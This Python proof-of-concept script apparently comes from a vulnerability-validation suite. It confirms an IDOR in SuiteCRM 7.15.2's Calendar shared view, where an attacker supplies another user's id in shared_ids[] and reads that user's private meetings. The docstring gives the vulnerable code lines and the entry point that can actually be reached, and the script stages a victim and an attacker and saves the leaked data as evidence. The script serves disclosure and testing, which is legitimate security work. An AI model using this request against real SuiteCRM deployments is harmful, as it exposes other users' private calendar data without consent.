#!/usr/bin/env python3
"""
VULN-029 -- Calendar shared view reads any user's Meetings/Calls/Tasks (IDOR)

Target: SuiteCRM 7.15.2 (targets/SuiteCRM/)
Root-cause sink (confirmed live): modules/Calendar/Calendar.php:376-378
    `init_shared()` copies `$_REQUEST['shared_ids']` verbatim into
    `$this->shared_ids` with **no check** that those user ids actually
    share their calendar with the caller. Every id in that attacker-
    controlled array is then fed to `add_activities($user)` ->
    `include/utils/activity_utils.php:build_related_list_by_user_id()`,
    a raw SQL query keyed only on `user_id`.

IMPORTANT reproduction correction (found during this dynamic validation --
see notes.md for the full trace): the finding's originally-cited sink,
`modules/Calendar/controller.php:307` `action_getActivities()` AJAX action,
is UNREACHABLE for the 'shared' case as literally written:
  - `Calendar::__construct()` resets any `$view` not present in
    `$this->views` (which does NOT include the literal string 'shared')
    back to 'agendaWeek' -- so `$cal->view` can never equal 'shared' when
    constructed via `new Calendar($_REQUEST['view'])`.
  - Even passing a *valid* view name like 'sharedWeek' doesn't help,
    because `action_getActivities()`'s own branch test is the literal
    string comparison `$cal->view == 'shared'`, which 'sharedWeek' also
    never satisfies.
  So `action_getActivities`'s shared branch is dead code through this
  entry point (dynamically confirmed: jsonData is always `[]`).

  The SAME vulnerable `init_shared()` / `add_activities()` chain IS live
  and reachable via the Calendar module's main page controller,
  `modules/Calendar/index.php:70-79`, which checks
  `$cal->view == "sharedMonth" || $cal->view == "sharedWeek"` (the
  correct, whitelisted view names) and is exactly what a real "Shared"
  calendar tab click sends. This script uses THAT entry point
  (`module=Calendar&action=index&view=sharedWeek`) -- the underlying
  defect (Calendar.php:376-378) and its impact are identical; only the
  specific reachable URL differs from the static finding's write-up.

What this script does
----------------------
1. Creates victim V and attacker A (fresh, unrelated low-priv users).
2. As V: creates a Meeting with a unique name + description, assigned to
   and inviting V (auto-added to meetings_users), scheduled for "today"
   in the app container's clock so it falls inside Calendar's query window.
3. As A: requests the shared calendar view with shared_ids[]=<V's user id>
   -- a value A never received consent for -- and asserts V's meeting
   name AND description (a value that only appears in the DB row, never
   in a GUID/URL) are present in A's own page.

Environment variables:
    BASE_URL, ADMIN_USER, ADMIN_PASS
"""
import os
import re
import sys
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login)

VULN_ID = "VULN-029"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "Calendar shared view reads any user's Meetings (IDOR)")

    log("SETUP", "admin web login; provisioning victim (V) and attacker (A)")
    admin = admin_session()
    victim = create_user(admin, "Victim@2026x!")
    attacker = create_user(admin, "Attacker@2026x!")
    log("INFO", f"victim   = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']}) -- V never shared her calendar with A")

    vs = web_login(victim["user_name"], victim["password"])

    log("SETUP", "as V: create a private Meeting for today (app-container clock), 24h time format (default_time_format=H:i)")
    meeting_name = rand("V029Meeting")
    desc_marker = rand("SECRETDESC029")
    today_str = datetime.now(timezone.utc).strftime("%m/%d/%Y")  # matches config.php default_date_format 'm/d/Y'
    log("INFO", f"scheduling meeting for {today_str} 10:00 (UTC 'today', within Calendar's -5/+1 day query window)")
    save_req = {
        "module": "Meetings", "action": "Save", "record": "",
        "name": meeting_name, "description": desc_marker,
        "date_start": today_str, "time_start": "10:00",
        "duration_hours": "1", "duration_minutes": "00",
        "assigned_user_id": victim["id"], "assigned_user_name": victim["user_name"],
        "status": "Planned",
    }
    r = vs.post(f"{BASE_URL}/index.php", data=save_req,
                headers={"Referer": f"{BASE_URL}/index.php?module=Meetings&action=EditView"},
                allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim Meeting (status={r.status_code})")
        sys.exit(1)
    meeting_id = m.group(1)
    log("OK", f"Meeting created: {meeting_id} name={meeting_name!r} description={desc_marker!r}, assigned_user=V")

    as_ = web_login(attacker["user_name"], attacker["password"])

    log("STEP", "as A: request the shared calendar view for V's user id (A was never given access)")
    params = {"module": "Calendar", "action": "index", "view": "sharedWeek", "shared_ids[]": victim["id"]}
    url = f"{BASE_URL}/index.php?" + "&".join(f"{k}={v}" for k, v in params.items())

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("### Attacker requests V's calendar as a 'shared' view; A was never granted sharing by V.\n")
        f.write(f"GET {url.replace(BASE_URL, '')} HTTP/1.1\n")
        f.write("Host: localhost:33116\nCookie: PHPSESSID=<attacker-session>\nUser-Agent: <browser>\n")

    r2 = as_.get(f"{BASE_URL}/index.php", params=params, timeout=30)

    name_hit = meeting_name in r2.text
    desc_hit = desc_marker in r2.text
    log("PROOF", f"response status={r2.status_code} len={len(r2.text)}")
    log("PROOF", f"victim meeting name {meeting_name!r} present in attacker's shared-view response: {name_hit}")
    log("PROOF", f"victim meeting description {desc_marker!r} present in attacker's shared-view response: {desc_hit}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {r2.status_code} {r2.reason}\n")
        for k, v in r2.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        idx = r2.text.find(meeting_name) if name_hit else 0
        f.write("--- excerpt around the leaked calendar_items JS payload ---\n")
        f.write(r2.text[max(0, idx - 400):idx + 600])

    if not (name_hit and desc_hit):
        verdict(VULN_ID, "FAILED", "attacker did not receive victim's meeting subject/description")
        sys.exit(1)

    with open(os.path.join(HERE, "evidence", "leaked_calendar_items.txt"), "w") as f:
        idx = r2.text.find("calendar_items")
        f.write(f"Victim meeting id: {meeting_id}\nVictim user id: {victim['id']}\n\n")
        f.write("Raw 'calendar_items' JS object embedded in attacker's page (contains victim's private meeting):\n")
        f.write(r2.text[max(0, idx - 50):idx + 900])

    log("OK", "attacker received victim's private Meeting subject + description with zero sharing consent")
    verdict(VULN_ID, "CONFIRMED",
            f"attacker read V's Meeting ('{meeting_name}' / '{desc_marker}') via Calendar shared_ids[] with no consent check")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
